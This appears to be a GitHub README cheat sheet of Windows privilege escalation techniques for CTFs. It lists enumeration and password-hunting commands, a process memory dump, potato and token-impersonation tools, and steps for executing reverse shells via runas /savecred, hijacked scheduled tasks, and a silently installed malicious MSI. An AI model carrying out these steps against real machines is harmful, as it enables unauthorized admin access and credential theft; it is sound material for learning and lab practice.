# Windows-PrivEsc-full-guide UNDER DEVELOPMENT

Hi Everybody! I made this repo to share the privilege escalation techniques I tend to use on Windows based systems. Most of the tools ore working perfectly in CTF like competitions/exams. Use them and the tools on your own responsability, if you mess up an an coorporative or your own system, that's gonna be your fault and not mine! Now let's get into it.

## Enumeration

basic-enum

hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe

user-enum

whoami
whoami /priv
whoami /groups
netuser
netuser "USERNAME"
net localgroup
net localgroup "GROUPNAME"
net accounts

network-enum

ipconfig
ipconfig /all
arp -a
route print
netstat -a

password-hunting

findstr /si password *.txt *.ini *.config
procdump.exe -accepteula -ma <proc_name_tasklist>
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView

service-enum

sc query
wmic service list brief
sc query windefend

firewall-enum

netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config

## Paths:

### Kernel exploits:

Execute the systeminfo command on the compromised system and save it in a file. Later you can feed this file into automated tools like windows-exploit-suggester or wesng. Also, you can look up kernel exploits manually using google, bing or other search engines.

If you have a meterpreter shell you can execute the following command to list out all the available kernel exploits:

run post/multi/recon/local_exploit_suggester

Common ones in CTFs are MS16-014 and MS09-012, I saw these popping up multiple times.

### Token impersonation

Tokens are like cookies when accesing to a website. They are assigned to every user upon logging in. The local administrator users got two of these tokens, one with the same priviliges as the a regular user and one with admin priviliges. When the local admin trying to execute a program with admin priviliges a window will pop up warning the user that the program may make changes on the system (UAC).

To make these type of attack work the compromised user must have the SeImpersonatePrivilege enabled, you can check for this with the whoami /priv command. Try the following exploits:

https://github.com/ohpe/juicy-potato          | works on older machines better (win7 and older)

https://github.com/antonioCoco/RogueWinRM     | winrm service must be stopped to make this work (default on win10 but not on Windows Server 2019)

https://github.com/CCob/SweetPotato           | a combination of potato attacks

https://github.com/itm4n/PrintSpoofer         | my go-to for newer systems

If you have a meterpreter shell you can use the a module called incognito with the following commands:

load incognito
list_tokens -u
impersonate_token "USERNAME"

### Runas

Windows includes a useful command called RunAs that enables a user to run a program as a different user if credentials are known. If a user’s credentials are cached in the system, the Runas command can be run using the /savecred flag which will automatically authenticate and execute the command as that user.

Check for cached credentials using the following command:

cmdkey /list

If you find the cached credentials of an administrator create a reverse shell or download one, transfer it to the machine and execute it with the following command to get admin access:

runas /savecred /user:User "Shell to execute"

e.g: runas /savecred /user:admin C:\reverse.exe

Make sure to set up a listener to catch the connection;).

For those who like to use tools for everything I recommend mimikatz and lasagne for these type of escalation attempts.

### Unattended Windows Installations

Administrators who need to install Windows on multiple hosts can use Windows Deployment Services, enabling them to deploy a single operating system image to several hosts over the network. This type of installation is known as an unattended installation, as it doesn't require user interaction.An administrator account is necessary for performing the initial setup of such installations, which may result in the storage of the account information on the machine in one of the following locations:

C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

### Scheduled Tasks

Check for scheduled tasks using schtasks. Use the following commands to retrive more information about the task:

schtasks /query /tn $taskname$ /fo list /v

For us there are two important parameters when setting up a scheduled task: the "Task to Run" parameter, which specifies what will be executed by the task, and the "Run As User" parameter, which determines the user account that will be used to run the task. If you can overwrite the binary of "Task to run" you can control what's gonna be executed. Check the permissions using icacls.

icacls c:\tasks\randomtask.exe

Rewrite it with a reverse shell of your choice and execute it with the following command or similar:

schtasks /run /tn randomtask.exe

### AlwaysInstallElevated

Installer files for Windows, commonly referred to as .msi files, are utilized to install software applications onto a system. Normally, these files run with the same privilege level as the user who initiated the installation. Nevertheless, it's possible to adjust the configuration to allow them to run with elevated privileges from any user account, including unprivileged ones. As a result, it's feasible for a malicious MSI file to be generated that could execute with administrative privileges.

Check for these two registers, both of them must be set to pull of this escalation path:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Create a reverse shell and upload it to the victim machine and use the following command to execute it:

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

### Password hunting

You can query the registries that are containing the word password with the following command:

reg query HKLM /f password /t REG_SZ /s

You can check each registry with the reg query command for more information.

e.g: reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

Pretty time consuming doing it manually, but if nothing works give it a go, otherwise use automated tools for this task.














